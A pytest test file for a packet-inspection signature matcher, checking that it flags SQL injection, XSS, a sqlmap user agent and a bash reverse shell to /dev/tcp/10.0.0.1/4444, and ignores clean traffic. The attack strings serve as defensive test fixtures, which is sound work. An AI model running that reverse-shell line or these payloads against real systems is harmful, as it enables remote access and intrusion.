import pytest
from dpi.detection.signatures import SignatureMatcher


class TestSignatureMatcher:
    def setup_method(self):
        self.matcher = SignatureMatcher()

    def test_detect_sql_injection(self):
        payload = "username=admin' OR '1'='1"
        matches = self.matcher.match(payload)
        assert len(matches) > 0
        assert any("SQL" in m[0] for m in matches)

    def test_detect_xss(self):
        payload = '<script>alert("xss")</script>'
        matches = self.matcher.match(payload)
        assert len(matches) > 0
        assert any("XSS" in m[0] or "Script" in m[0] for m in matches)

    def test_detect_reverse_shell(self):
        payload = "/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        matches = self.matcher.match(payload)
        assert len(matches) > 0
        assert any("Shell" in m[0] for m in matches)

    def test_detect_suspicious_user_agent(self):
        payload = "User-Agent: sqlmap/1.6"
        matches = self.matcher.match(payload)
        assert len(matches) > 0
        assert any("User Agent" in m[0] for m in matches)

    def test_clean_payload(self):
        payload = "GET /index.html HTTP/1.1"
        matches = self.matcher.match(payload)
        assert len(matches) == 0

    def test_empty_payload(self):
        matches = self.matcher.match("")
        assert len(matches) == 0

    def test_add_custom_signature(self):
        self.matcher.add_signature(
            "Test Pattern",
            r"custom_test_pattern",
            "LOW",
            "Test description"
        )
        matches = self.matcher.match("this has custom_test_pattern in it")
        assert len(matches) == 1
        assert matches[0][0] == "Test Pattern"


class TestRuleEngine:
    def test_rule_engine_import(self):
        from dpi.detection.rules import RuleEngine
        engine = RuleEngine()
        assert engine is not None
        assert isinstance(engine.rules, list)